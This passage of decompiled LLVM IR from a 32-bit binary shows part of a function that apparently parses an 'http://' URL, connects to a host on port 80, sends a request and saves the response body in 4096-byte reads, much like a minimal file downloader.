  store i32 0, i32* %stack_var_-5244, align 4
  %v1_8048983 = call i32 @function_804eec4(i32 0)
  %v0_8048988.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048988

dec_label_pc_8048988:                             ; preds = %dec_label_pc_8048962, %dec_label_pc_8048968
  %v0_8048988 = phi i32 [ %v0_8048988.pre, %dec_label_pc_8048968 ], [ %v12_8048946, %dec_label_pc_8048962 ]
  %v5_8048988 = icmp ult i32 %v0_8048988, 4
  store i1 %v5_8048988, i1* %cf.global-to-local, align 1
  store i32 2, i32* %stack_var_-5244, align 4
  %v4_8048991 = call i32 @function_804da00(i32 2, i32 1, i32 0)
  %v8_804899c = icmp ne i32 %v4_8048991, -1
  store i1 %v8_804899c, i1* %cf.global-to-local, align 1
  %v13_804899c = icmp eq i32 %v4_8048991, -1
  %v1_80489a0 = icmp eq i1 %v13_804899c, false
  br i1 %v1_80489a0, label %dec_label_pc_80489c2, label %dec_label_pc_80489a2

dec_label_pc_80489a2:                             ; preds = %dec_label_pc_8048988
  %v5_80489a2 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_80489a2, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_80489b0 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8052560.18 to i32))
  store i32 %v3_80489b0, i32* @eax, align 4
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5244, align 4
  %v1_80489bd = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_80489c2

dec_label_pc_80489c2:                             ; preds = %dec_label_pc_8048988, %dec_label_pc_80489a2
  %v1_80489c5 = add i32 %arg4, 4
  %v5_80489c5 = icmp ugt i32 %arg4, -5
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v1_80489c8 = inttoptr i32 %v1_80489c5 to i32*
  %v2_80489c8 = load i32, i32* %v1_80489c8, align 4
  store i1 false, i1* @df, align 1
  %v4_80489e5 = inttoptr i32 %v2_80489c8 to i8*
  store i32 %v2_80489c8, i32* @esi, align 4
  %v7_80489f7 = call i32 @_strncmp(i8* %v4_80489e5, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8052585.19, i32 0, i32 0), i32 7)
  %v8_80489f7 = urem i32 %v7_80489f7, 2
  %v9_80489f7 = icmp eq i32 %v8_80489f7, 0
  %v0_80489f9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80489f9 = or i1 %v0_80489f9, %v9_80489f7
  %v3_80489f9 = zext i1 %v2_80489f9 to i32
  %v4_80489f9 = load i32, i32* @edx, align 4
  %v5_80489f9 = and i32 %v4_80489f9, -256
  %v6_80489f9 = or i32 %v3_80489f9, %v5_80489f9
  %v7_80489f9 = xor i32 %v6_80489f9, 1
  store i32 %v7_80489f9, i32* %edx.global-to-local, align 4
  %v1_8048a01 = trunc i32 %v7_80489f9 to i8
  %v3_8048a01 = zext i1 %v0_80489f9 to i8
  %v15_8048a01 = icmp eq i8 %v1_8048a01, %v3_8048a01
  %v1_8048a0a = icmp eq i1 %v15_8048a01, false
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v2_8048a32 = load i32, i32* %v1_80489c8, align 4
  br i1 %v1_8048a0a, label %dec_label_pc_8048a2c, label %dec_label_pc_8048a0c

dec_label_pc_8048a0c:                             ; preds = %dec_label_pc_80489c2
  %v1_8048a14 = add i32 %v2_8048a32, 7
  %v0_8048a17 = load i32, i32* @esp, align 4
  %v5_8048a17 = icmp ult i32 %v0_8048a17, 8
  store i1 %v5_8048a17, i1* %cf.global-to-local, align 1
  %v2_8048a1b = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a1b, i32* @eax, align 4
  store i32 %v2_8048a1b, i32* %stack_var_-5244, align 4
  %v3_8048a22 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a22 = call i32 @function_804d190(i8* %v3_8048a22, i32 %v1_8048a14)
  br label %dec_label_pc_8048a47

dec_label_pc_8048a2c:                             ; preds = %dec_label_pc_80489c2
  %v0_8048a34 = load i32, i32* @esp, align 4
  %v5_8048a34 = icmp ult i32 %v0_8048a34, 8
  store i1 %v5_8048a34, i1* %cf.global-to-local, align 1
  %v2_8048a38 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a38, i32* @eax, align 4
  store i32 %v2_8048a38, i32* %stack_var_-5244, align 4
  %v3_8048a3f = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a3f = call i32 @function_804d190(i8* %v3_8048a3f, i32 %v2_8048a32)
  br label %dec_label_pc_8048a47

dec_label_pc_8048a47:                             ; preds = %dec_label_pc_8048a0c, %dec_label_pc_8048a2c
  %v4_8048a6a.pre-phi = phi i8* [ %v3_8048a22, %dec_label_pc_8048a0c ], [ %v3_8048a3f, %dec_label_pc_8048a2c ]
  %v2_8048a56.pre-phi = phi i32 [ %v2_8048a1b, %dec_label_pc_8048a0c ], [ %v2_8048a38, %dec_label_pc_8048a2c ]
  %storemerge16.in = load i32, i32* @esp, align 4
  %storemerge16 = icmp ugt i32 %storemerge16.in, -17
  store i1 %storemerge16, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048a53

dec_label_pc_8048a50:                             ; preds = %dec_label_pc_8048a7b
  %v4_8048a50 = add i32 %storemerge8, 1
  br label %dec_label_pc_8048a53

dec_label_pc_8048a53:                             ; preds = %dec_label_pc_8048a47, %dec_label_pc_8048a50
  %storemerge8 = phi i32 [ %v4_8048a50, %dec_label_pc_8048a50 ], [ 0, %dec_label_pc_8048a47 ]
  store i32 %storemerge8, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048a56.pre-phi, i32* @edi, align 4
  %v3_8048a70 = call i32 @_strlen(i8* %v4_8048a6a.pre-phi)
  %v0_8048a77 = load i32, i32* @edx, align 4
  %v7_8048a77 = icmp ult i32 %v0_8048a77, %v3_8048a70
  store i1 %v7_8048a77, i1* %cf.global-to-local, align 1
  %v1_8048a79 = icmp eq i1 %v7_8048a77, false
  br i1 %v1_8048a79, label %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge, label %dec_label_pc_8048a7b

dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge: ; preds = %dec_label_pc_8048a53
  %v0_8048a8c.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge8, -1092
  br label %dec_label_pc_8048a89

dec_label_pc_8048a7b:                             ; preds = %dec_label_pc_8048a53
  %v0_8048a7e = load i32, i32* @ebp, align 4
  %v2_8048a7e = add i32 %storemerge8, -1092
  %v3_8048a7e = add i32 %v0_8048a7e, %v2_8048a7e
  %v4_8048a7e = inttoptr i32 %v3_8048a7e to i8*
  %v5_8048a7e = load i8, i8* %v4_8048a7e, align 1
  %v6_8048a85 = icmp ult i8 %v5_8048a7e, 47
  store i1 %v6_8048a85, i1* %cf.global-to-local, align 1
  %v10_8048a85 = icmp eq i8 %v5_8048a7e, 47
  %v1_8048a87 = icmp eq i1 %v10_8048a85, false
  br i1 %v1_8048a87, label %dec_label_pc_8048a50, label %dec_label_pc_8048a89

dec_label_pc_8048a89:                             ; preds = %dec_label_pc_8048a7b, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge
  %v2_8048a8c.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge ], [ %v2_8048a7e, %dec_label_pc_8048a7b ]
  %v0_8048a8c = phi i32 [ %v0_8048a8c.pre, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge ], [ %v0_8048a7e, %dec_label_pc_8048a7b ]
  %v3_8048a8c = add i32 %v0_8048a8c, %v2_8048a8c.pre-phi
  %v4_8048a8c = inttoptr i32 %v3_8048a8c to i8*
  store i8 0, i8* %v4_8048a8c, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8048a9a = load i32, i32* @esp, align 4
  %v5_8048a9a = icmp ult i32 %v0_8048a9a, 12
  store i1 %v5_8048a9a, i1* %cf.global-to-local, align 1
  store i32 80, i32* %stack_var_-5244, align 4
  %v1_8048a9f = call i32 @function_804d410(i32 80)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 %v2_8048a56.pre-phi, i32* %stack_var_-5244, align 4
  %v1_8048ab5 = call i32 @function_804d518(i32 %v2_8048a56.pre-phi)
  %v8_8048ac0 = icmp ne i32 %v1_8048ab5, -1
  store i1 %v8_8048ac0, i1* %cf.global-to-local, align 1
  %v13_8048ac0 = icmp eq i32 %v1_8048ab5, -1
  %v1_8048ac4 = icmp eq i1 %v13_8048ac0, false
  br i1 %v1_8048ac4, label %dec_label_pc_8048b20, label %dec_label_pc_8048ac6

dec_label_pc_8048ac6:                             ; preds = %dec_label_pc_8048a89
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 %v2_8048a56.pre-phi, i32* %stack_var_-5244, align 4
  %v1_8048ad0 = call i32 @function_804d540(i32 %v2_8048a56.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048adb = icmp eq i32 %v1_8048ad0, 0
  %v1_8048adf = icmp eq i1 %v4_8048adb, false
  br i1 %v1_8048adf, label %dec_label_pc_8048b01, label %dec_label_pc_8048ae1

dec_label_pc_8048ae1:                             ; preds = %dec_label_pc_8048ac6
  %v5_8048ae1 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048ae1, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_8048aef = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052590.20 to i32))
  store i32 %v3_8048aef, i32* @eax, align 4
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5244, align 4
  %v1_8048afc = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_8048b01

dec_label_pc_8048b01:                             ; preds = %dec_label_pc_8048ac6, %dec_label_pc_8048ae1
  %v1_8048b04 = add i32 %v1_8048ad0, 12
  %v2_8048b04 = inttoptr i32 %v1_8048b04 to i32*
  %v3_8048b04 = load i32, i32* %v2_8048b04, align 4
  %v1_8048b0c = add i32 %v1_8048ad0, 16
  %v2_8048b0c = inttoptr i32 %v1_8048b0c to i32*
  %v3_8048b0c = load i32, i32* %v2_8048b0c, align 4
  %v1_8048b0f = inttoptr i32 %v3_8048b0c to i32*
  %v2_8048b0f = load i32, i32* %v1_8048b0f, align 4
  store i32 %v2_8048b0f, i32* %edx.global-to-local, align 4
  %v5_8048b14 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048b14, i1* %cf.global-to-local, align 1
  %v15_8048b14 = ptrtoint i32* %stack_var_-68 to i32
  %tmp88 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048b14, i32* @edi, align 4
  %v1_8048b19 = inttoptr i32 %v2_8048b0f to i8*
  store i32 %v2_8048b0f, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048b1c = call i8* @_memcpy(i8* %tmp88, i8* %v1_8048b19, i32 %v3_8048b04)
  %v0_8048b3c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048b26

dec_label_pc_8048b20:                             ; preds = %dec_label_pc_8048a89
  store i32 %v1_8048ab5, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048b26

dec_label_pc_8048b26:                             ; preds = %dec_label_pc_8048b01, %dec_label_pc_8048b20
  %v0_8048b3c = phi i32 [ %v0_8048b3c.pre, %dec_label_pc_8048b01 ], [ %v12_8048946, %dec_label_pc_8048b20 ]
  %v2_8048b26.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048b3c = icmp ult i32 %v0_8048b3c, 4
  store i1 %v5_8048b3c, i1* %cf.global-to-local, align 1
  %v4_8048b45 = call i32 @function_804d8fc(i32 %v4_8048991, i32 %v2_8048b26.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048b4d = icmp eq i32 %v4_8048b45, 0
  br i1 %v1_8048b4d, label %dec_label_pc_8048b71, label %dec_label_pc_8048b51

dec_label_pc_8048b51:                             ; preds = %dec_label_pc_8048b26
  %v5_8048b51 = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b51, i1* %cf.global-to-local, align 1
  %v3_8048b5f = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80525b8.21 to i32))
  store i32 %v3_8048b5f, i32* @eax, align 4
  %v5_8048b67 = icmp ult i32* %stack_var_-5244, inttoptr (i32 12 to i32*)
  store i1 %v5_8048b67, i1* %cf.global-to-local, align 1
  %v1_8048b6c = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_8048b71

dec_label_pc_8048b71:                             ; preds = %dec_label_pc_8048b26, %dec_label_pc_8048b51
  %v2_8048b7c = add i32 %storemerge8, %v2_8048a56.pre-phi
  %v7_8048b7c = icmp ult i32 %v2_8048b7c, %v2_8048a56.pre-phi
  store i1 %v7_8048b7c, i1* %cf.global-to-local, align 1
  %v1_8048b7e = add i32 %v2_8048b7c, 1
  store i32 %v1_8048b7e, i32* %edx.global-to-local, align 4
  %v3_8048b91 = call i32 @function_80482b2(i32 %v4_8048991, i32 ptrtoint ([276 x i8]* @global_var_80525e0.22 to i32))
  %v5_8048b99 = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b99, i1* %cf.global-to-local, align 1
  %v3_8048ba7 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_80526f4.23 to i32))
  %v1_8048bb2 = add i32 %arg4, 8
  %v5_8048bb2 = icmp ugt i32 %arg4, -9
  %v1_8048bb5 = inttoptr i32 %v1_8048bb2 to i32*
  %v2_8048bb5 = load i32, i32* %v1_8048bb5, align 4
  store i32 %v2_8048bb5, i32* @eax, align 4
  %v5_8048bb7 = icmp ult i32* %stack_var_-5244, inttoptr (i32 8 to i32*)
  store i1 %v5_8048bb7, i1* %cf.global-to-local, align 1
  %v3_8048bc0 = call i32 @function_804b888(i32 %v2_8048bb5, i32 ptrtoint ([3 x i8]* @global_var_8052710.24 to i32))
  %v0_8048bc5 = load i32, i32* @esp, align 4
  %v2_8048bc5 = icmp ugt i32 %v0_8048bc5, -17
  store i1 %v2_8048bc5, i1* %cf.global-to-local, align 1
  %v2_8048bd2 = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048bdc111 = call i32 @function_804d94c(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp89113 = icmp slt i32 %v5_8048bdc111, 1
  br i1 %tmp89113, label %dec_label_pc_8048d08.loopexit17, label %dec_label_pc_8048bf1

dec_label_pc_8048bcb.loopexit:                    ; preds = %dec_label_pc_8048cf4
  %v5_8048bdc = call i32 @function_804d94c(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp89 = icmp slt i32 %v5_8048bdc, 1
  br i1 %tmp89, label %dec_label_pc_8048d08.loopexit17, label %dec_label_pc_8048bf1

dec_label_pc_8048bf1:                             ; preds = %dec_label_pc_8048b71, %dec_label_pc_8048bcb.loopexit
  %v5_8048bdc114 = phi i32 [ %v5_8048bdc, %dec_label_pc_8048bcb.loopexit ], [ %v5_8048bdc111, %dec_label_pc_8048b71 ]
  %v4_8048bf1 = add i32 %v5_8048bdc114, -4095
  %v8_8048bf1 = icmp ult i32 %v5_8048bdc114, 4095
  %v9_8048bf1 = sub i32 4094, %v5_8048bdc114
  %v10_8048bf1 = and i32 %v9_8048bf1, %v5_8048bdc114
  %v11_8048bf1 = icmp slt i32 %v10_8048bf1, 0
  store i1 %v8_8048bf1, i1* %cf.global-to-local, align 1
  %v12_8048bf1 = icmp eq i32 %v4_8048bf1, 0
  %v13_8048bf1 = icmp slt i32 %v4_8048bf1, 0
  %v3_8048bf8 = icmp eq i1 %v13_8048bf1, %v11_8048bf1
  %v4_8048bf8 = icmp eq i1 %v12_8048bf1, false
  %v5_8048bf8 = and i1 %v4_8048bf8, %v3_8048bf8
  br i1 %v5_8048bf8, label %dec_label_pc_8048c11.lr.ph, label %dec_label_pc_8048bfa

dec_label_pc_8048bfa:                             ; preds = %dec_label_pc_8048bf1
  %v0_8048bfd = load i32, i32* @ebp, align 4
  %v2_8048bfd = add i32 %v5_8048bdc114, -5188
  %v3_8048bfd = add i32 %v2_8048bfd, %v0_8048bfd
  %v4_8048bfd = inttoptr i32 %v3_8048bfd to i8*
  store i8 0, i8* %v4_8048bfd, align 1
  br label %dec_label_pc_8048c11.lr.ph

dec_label_pc_8048c11.lr.ph:                       ; preds = %dec_label_pc_8048bfa, %dec_label_pc_8048bf1
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c11

dec_label_pc_8048c11:                             ; preds = %dec_label_pc_8048c11.lr.ph, %dec_label_pc_8048cf4
  %storemerge7110 = phi i32 [ 0, %dec_label_pc_8048c11.lr.ph ], [ %v4_8048cf4, %dec_label_pc_8048cf4 ]
  store i32 %storemerge7110, i32* %edx.global-to-local, align 4
  %v2_8048c1c = add i32 %storemerge7110, %v2_8048bd2
  %v7_8048c1c = icmp ult i32 %v2_8048c1c, %v2_8048bd2
  store i1 %v7_8048c1c, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048c39 = inttoptr i32 %v2_8048c1c to i8*
  store i32 %v2_8048c1c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052713.25 to i32), i32* @edi, align 4
  %v7_8048c4b = call i32 @_strncmp(i8* %v4_8048c39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052713.25, i32 0, i32 0), i32 4)
  %v8_8048c4b = urem i32 %v7_8048c4b, 2
  %v9_8048c4b = icmp eq i32 %v8_8048c4b, 0
  %v0_8048c4d = load i1, i1* %cf.global-to-local, align 1
  %v2_8048c4d = or i1 %v0_8048c4d, %v9_8048c4b
  %v3_8048c4d = zext i1 %v2_8048c4d to i32
  %v4_8048c4d = load i32, i32* %edx.global-to-local, align 4
  %v5_8048c4d = and i32 %v4_8048c4d, -256
  %v6_8048c4d = or i32 %v3_8048c4d, %v5_8048c4d
  %v7_8048c4d = xor i32 %v6_8048c4d, 1
  store i32 %v7_8048c4d, i32* @edx, align 4
  %v3_8048c53 = and i32 %v7_8048c4b, -256
  %v1_8048c55 = trunc i32 %v7_8048c4d to i8
  %v3_8048c55 = zext i1 %v0_8048c4d to i8
  %v4_8048c55 = sub nsw i8 %v1_8048c55, %v3_8048c55
  %v15_8048c55 = icmp eq i8 %v4_8048c55, 0
  %v20_8048c55 = zext i8 %v4_8048c55 to i32
  %v23_8048c55 = or i32 %v20_8048c55, %v3_8048c53
  store i32 %v23_8048c55, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c5e = icmp eq i1 %v15_8048c55, false
  br i1 %v1_8048c5e, label %dec_label_pc_8048cf4, label %dec_label_pc_8048c64

dec_label_pc_8048c64:                             ; preds = %dec_label_pc_8048c11
  %v4_8048c64 = add i32 %storemerge7110, 4
  %v1_8048c73 = add i32 %v3_8048bc0, 52
  %v2_8048c73 = inttoptr i32 %v1_8048c73 to i32*
  %v1_8048c7d = add i32 %v3_8048bc0, 16
  %v2_8048c7d = inttoptr i32 %v1_8048c7d to i32*
  %v1_8048c83 = add i32 %v3_8048bc0, 28
  %v2_8048c83 = inttoptr i32 %v1_8048c83 to i32*
  %v10_8048ce9103 = icmp ult i32 %v4_8048c64, %v5_8048bdc114
  store i1 %v10_8048ce9103, i1* %cf.global-to-local, align 1
  %v5_8048cec105 = icmp slt i32 %v4_8048c64, %v5_8048bdc114
  br i1 %v5_8048cec105, label %dec_label_pc_8048c6a, label %dec_label_pc_8048d08

dec_label_pc_8048c6a:                             ; preds = %dec_label_pc_8048c64, %dec_label_pc_8048ce3
  %storemerge13.in106 = phi i32 [ %v4_8048ce3, %dec_label_pc_8048ce3 ], [ %v4_8048c64, %dec_label_pc_8048c64 ]
  %v3_8048c73 = load i32, i32* %v2_8048c73, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c76 = icmp eq i32 %v3_8048c73, 0
  br i1 %v1_8048c76, label %dec_label_pc_8048cc5, label %dec_label_pc_8048c7a

dec_label_pc_8048c7a:                             ; preds = %dec_label_pc_8048c6a
  %v3_8048c7d = load i32, i32* %v2_8048c7d, align 4
  store i32 %v3_8048c7d, i32* @edx, align 4
  %v3_8048c83 = load i32, i32* %v2_8048c83, align 4
  %v7_8048c86 = icmp ult i32 %v3_8048c7d, %v3_8048c83
  store i1 %v7_8048c86, i1* %cf.global-to-local, align 1
  %v1_8048c88 = icmp eq i1 %v7_8048c86, false
  br i1 %v1_8048c88, label %dec_label_pc_8048ca5, label %dec_label_pc_8048c8a

dec_label_pc_8048c8a:                             ; preds = %dec_label_pc_8048c7a
  %v3_8048c8d = load i32, i32* %v2_8048c7d, align 4
  store i32 %v3_8048c8d, i32* %edx.global-to-local, align 4
  %v0_8048c93 = load i32, i32* @ebp, align 4
  %v2_8048c93 = add i32 %storemerge13.in106, -5188
  %v3_8048c93 = add i32 %v2_8048c93, %v0_8048c93
  %v4_8048c93 = inttoptr i32 %v3_8048c93 to i8*
  %v5_8048c93 = load i8, i8* %v4_8048c93, align 1
  %v3_8048c9a = inttoptr i32 %v3_8048c8d to i8*
  store i8 %v5_8048c93, i8* %v3_8048c9a, align 1
  %v0_8048c9c = load i32, i32* %edx.global-to-local, align 4
  %v1_8048c9c = add i32 %v0_8048c9c, 1
  store i32 %v1_8048c9c, i32* @edx, align 4
  store i32 %v1_8048c9c, i32* %v2_8048c7d, align 4
  br label %dec_label_pc_8048ce3

dec_label_pc_8048ca5:                             ; preds = %dec_label_pc_8048c7a
  %v0_8048ca8 = load i32, i32* @ebp, align 4
  %v2_8048ca8 = add i32 %storemerge13.in106, -5188
  %v3_8048ca8 = add i32 %v2_8048ca8, %v0_8048ca8
  %v4_8048ca8 = inttoptr i32 %v3_8048ca8 to i8*
  %v5_8048ca8 = load i8, i8* %v4_8048ca8, align 1
  %v0_8048cb4 = load i32, i32* @esp, align 4
  %v5_8048cb4 = icmp ult i32 %v0_8048cb4, 8
  store i1 %v5_8048cb4, i1* %cf.global-to-local, align 1
  %v4_8048cbb = call i32 @function_804cfe0(i8 %v5_8048ca8, i32 %v3_8048bc0)
  %v0_8048cc0 = load i32, i32* @esp, align 4
  %v2_8048cc0 = icmp ugt i32 %v0_8048cc0, -17
  store i1 %v2_8048cc0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048ce3

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c6a
  %v0_8048cc8 = load i32, i32* @ebp, align 4
  %v2_8048cc8 = add i32 %storemerge13.in106, -5188
  %v3_8048cc8 = add i32 %v2_8048cc8, %v0_8048cc8
  %v4_8048cc8 = inttoptr i32 %v3_8048cc8 to i8*
  %v5_8048cc8 = load i8, i8* %v4_8048cc8, align 1
  %v0_8048cd4 = load i32, i32* @esp, align 4
  %v5_8048cd4 = icmp ult i32 %v0_8048cd4, 8
  store i1 %v5_8048cd4, i1* %cf.global-to-local, align 1
  %v4_8048cdb = call i32 @function_804cc58(i8 %v5_8048cc8, i32 %v3_8048bc0)
  %v0_8048ce0 = load i32, i32* @esp, align 4
  %v2_8048ce0 = icmp ugt i32 %v0_8048ce0, -17
  store i1 %v2_8048ce0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048ce3

dec_label_pc_8048ce3:                             ; preds = %dec_label_pc_8048ca5, %dec_label_pc_8048c8a, %dec_label_pc_8048cc5
  %v4_8048ce3 = add i32 %storemerge13.in106, 1
  %v10_8048ce9 = icmp ult i32 %v4_8048ce3, %v5_8048bdc114
  store i1 %v10_8048ce9, i1* %cf.global-to-local, align 1
  %exitcond119 = icmp eq i32 %v4_8048ce3, %v5_8048bdc114
  br i1 %exitcond119, label %dec_label_pc_8048d08, label %dec_label_pc_8048c6a

dec_label_pc_8048cf4:                             ; preds = %dec_label_pc_8048c11
  %v4_8048cf4 = add nuw nsw i32 %storemerge7110, 1
  %v10_8048cfa = icmp ult i32 %v4_8048cf4, %v5_8048bdc114
  store i1 %v10_8048cfa, i1* %cf.global-to-local, align 1
  %v5_8048cfd = icmp slt i32 %v4_8048cf4, %v5_8048bdc114
  br i1 %v5_8048cfd, label %dec_label_pc_8048c11, label %dec_label_pc_8048bcb.loopexit

dec_label_pc_8048d08.loopexit17:                  ; preds = %dec_label_pc_8048bcb.loopexit, %dec_label_pc_8048b71
  %.pre31 = add i32 %v3_8048bc0, 52
  %.pre32 = inttoptr i32 %.pre31 to i32*
  %.pre34 = add i32 %v3_8048bc0, 16
  %.pre35 = inttoptr i32 %.pre34 to i32*
  %.pre36 = add i32 %v3_8048bc0, 28
  %.pre37 = inttoptr i32 %.pre36 to i32*
  br label %dec_label_pc_8048d08

dec_label_pc_8048d08:                             ; preds = %dec_label_pc_8048c64, %dec_label_pc_8048ce3, %dec_label_pc_8048d08.loopexit17
  %v2_8048d80.pre-phi = phi i32* [ %.pre37, %dec_label_pc_8048d08.loopexit17 ], [ %v2_8048c83, %dec_label_pc_8048ce3 ], [ %v2_8048c83, %dec_label_pc_8048c64 ]
  %v2_8048d7a.pre-phi = phi i32* [ %.pre35, %dec_label_pc_8048d08.loopexit17 ], [ %v2_8048c7d, %dec_label_pc_8048ce3 ], [ %v2_8048c7d, %dec_label_pc_8048c64 ]
  %v2_8048d70.pre-phi = phi i32* [ %.pre32, %dec_label_pc_8048d08.loopexit17 ], [ %v2_8048c73, %dec_label_pc_8048ce3 ], [ %v2_8048c73, %dec_label_pc_8048c64 ]
  store i1 %v5_8048bb2, i1* %cf.global-to-local, align 1
  %v3_8048d1c = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052718.26 to i32))
  %v0_8048d21 = load i32, i32* @esp, align 4
  %v2_8048d21 = icmp ugt i32 %v0_8048d21, -17
  store i1 %v2_8048d21, i1* %cf.global-to-local, align 1
  %v5_8048d3599 = call i32 @function_804d94c(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i32 %v5_8048d3599, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp90101 = icmp slt i32 %v5_8048d3599, 1
  br i1 %tmp90101, label %dec_label_pc_8048df4, label %dec_label_pc_8048d4a

dec_label_pc_8048d24.loopexit:                    ; preds = %dec_label_pc_8048de0
  %v5_8048d35 = call i32 @function_804d94c(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i32 %v5_8048d35, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp90 = icmp slt i32 %v5_8048d35, 1
  br i1 %tmp90, label %dec_label_pc_8048df4, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d08, %dec_label_pc_8048d24.loopexit
  %v5_8048d35102 = phi i32 [ %v5_8048d35, %dec_label_pc_8048d24.loopexit ], [ %v5_8048d3599, %dec_label_pc_8048d08 ]
  %v4_8048d4a = add i32 %v5_8048d35102, -4095
  %v8_8048d4a = icmp ult i32 %v5_8048d35102, 4095
  %v9_8048d4a = sub i32 4094, %v5_8048d35102
  %v10_8048d4a = and i32 %v9_8048d4a, %v5_8048d35102
  %v11_8048d4a = icmp slt i32 %v10_8048d4a, 0
  store i1 %v8_8048d4a, i1* %cf.global-to-local, align 1
  %v12_8048d4a = icmp eq i32 %v4_8048d4a, 0
  %v13_8048d4a = icmp slt i32 %v4_8048d4a, 0
  %v3_8048d51 = icmp eq i1 %v13_8048d4a, %v11_8048d4a
  %v4_8048d51 = icmp eq i1 %v12_8048d4a, false
  %v5_8048d51 = and i1 %v4_8048d51, %v3_8048d51
  br i1 %v5_8048d51, label %dec_label_pc_8048d67.lr.ph, label %dec_label_pc_8048d53

dec_label_pc_8048d53:                             ; preds = %dec_label_pc_8048d4a
  %v0_8048d56 = load i32, i32* @ebp, align 4
  %v2_8048d56 = add i32 %v5_8048d35102, -5188
  %v3_8048d56 = add i32 %v2_8048d56, %v0_8048d56
  %v4_8048d56 = inttoptr i32 %v3_8048d56 to i8*
  store i8 0, i8* %v4_8048d56, align 1
  br label %dec_label_pc_8048d67.lr.ph

dec_label_pc_8048d67.lr.ph:                       ; preds = %dec_label_pc_8048d53, %dec_label_pc_8048d4a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d67

dec_label_pc_8048d67:                             ; preds = %dec_label_pc_8048de0, %dec_label_pc_8048d67.lr.ph
  %storemerge598 = phi i32 [ 0, %dec_label_pc_8048d67.lr.ph ], [ %v4_8048de0, %dec_label_pc_8048de0 ]
  %v3_8048d70 = load i32, i32* %v2_8048d70.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d73 = icmp eq i32 %v3_8048d70, 0
  br i1 %v1_8048d73, label %dec_label_pc_8048dc2, label %dec_label_pc_8048d77

dec_label_pc_8048d77:                             ; preds = %dec_label_pc_8048d67
  %v3_8048d7a = load i32, i32* %v2_8048d7a.pre-phi, align 4
  store i32 %v3_8048d7a, i32* @edx, align 4
  %v3_8048d80 = load i32, i32* %v2_8048d80.pre-phi, align 4
  %v7_8048d83 = icmp ult i32 %v3_8048d7a, %v3_8048d80
  store i1 %v7_8048d83, i1* %cf.global-to-local, align 1
